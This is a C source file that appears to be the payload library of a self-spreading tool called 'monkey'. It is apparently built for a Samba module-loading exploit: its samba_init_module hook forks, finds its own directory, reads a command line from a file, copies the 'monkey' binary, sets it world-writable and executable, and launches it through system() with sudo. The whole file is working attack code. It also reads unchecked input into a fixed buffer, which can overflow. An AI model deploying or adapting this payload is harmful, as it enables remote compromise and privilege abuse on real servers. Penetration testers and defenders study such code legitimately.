#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "monkey_runner.h"

#define LINE_MAX_LENGTH (2048)
#define MAX_PARAMETERS (30)

int samba_init_module(void)
{
	const char RUNNER_FILENAME[] = "monkey_runner.so";
	const char COMMANDLINE_FILENAME[] = "monkey_commandline.txt";
	const char ACCESS_MODE_STRING[] = "0777";
	const char MONKEY_NAME[] = "monkey";
	const char MONKEY_COPY_NAME[] = "monkey2";
	const char RUN_MONKEY_CMD[] = "sudo ./";
	
	int found = 0;
	char modulePathLine[LINE_MAX_LENGTH];
	char commandline[LINE_MAX_LENGTH] = {'\0'};
	char* monkeyDirectory;
	char* fileNamePointer;
    int accessMode;
	FILE * pFile;
	pid_t pid = 0;
	int monkeySize;
	void* monkeyBinary;
	
	pid = fork();
	
	if (pid != 0)
	{
		// error or this is parent - nothing to do but return.
		return 0;
	}
	
	// Find fullpath of running module.
	pFile = fopen("/proc/self/maps", "r");
	if (pFile == NULL)
	{
		return 0;
	}
	
	while (fgets(modulePathLine, LINE_MAX_LENGTH, pFile) != NULL) {
		fileNamePointer = strstr(modulePathLine, RUNNER_FILENAME);
        if (fileNamePointer != NULL) {
			found = 1;
			break;
        }
	}
	
	fclose(pFile);
	
	// We can't find ourselves in module list
	if (found == 0)
	{
		return 0;
	}
	
	monkeyDirectory = strchr(modulePathLine, '/');
	*fileNamePointer = '\0';
	
	if (chdir(monkeyDirectory) < 0)
	{
		return 0;
	}
	
	// Read commandline
	pFile = fopen(COMMANDLINE_FILENAME, "r");
	if (pFile == NULL)
	{
		return 0;
	}
	
	// Build commandline
	strcpy(commandline, RUN_MONKEY_CMD);
	strcpy(commandline + strlen(RUN_MONKEY_CMD), MONKEY_COPY_NAME);
	commandline[strlen(RUN_MONKEY_CMD) + strlen(MONKEY_COPY_NAME)] = ' ';
	
	fread(commandline + strlen(RUN_MONKEY_CMD) + strlen(MONKEY_COPY_NAME) + 1, 1, LINE_MAX_LENGTH, pFile);
	fclose(pFile);
	
	// Copy monkey to new file so we'll own it.
	pFile = fopen(MONKEY_NAME, "rb");
	
	if (pFile == NULL)
	{
		return 0;
	}
	
	if (0 != fseek (pFile , 0 , SEEK_END))
	{
		return 0;
	}
	
	monkeySize = ftell (pFile);
	
	if (-1 == monkeySize)
	{
		return 0;
	}
	
	rewind(pFile);
	
	monkeyBinary = malloc(monkeySize);
	
	if (0 == monkeyBinary)
	{
		return 0;
	}
	
	fread(monkeyBinary, 1, monkeySize, pFile);
	fclose(pFile);
	
	pFile = fopen(MONKEY_COPY_NAME, "wb");
	fwrite(monkeyBinary, 1, monkeySize, pFile);
	fclose(pFile);
	free(monkeyBinary);
	
	// Change monkey permissions
    accessMode = strtol(ACCESS_MODE_STRING, 0, 8);
    if (chmod (MONKEY_COPY_NAME, accessMode) < 0)
    {
        return 0;
    }
	
	system(commandline);

	return 0;
}

int init_samba_module(void)
{
	return samba_init_module();
}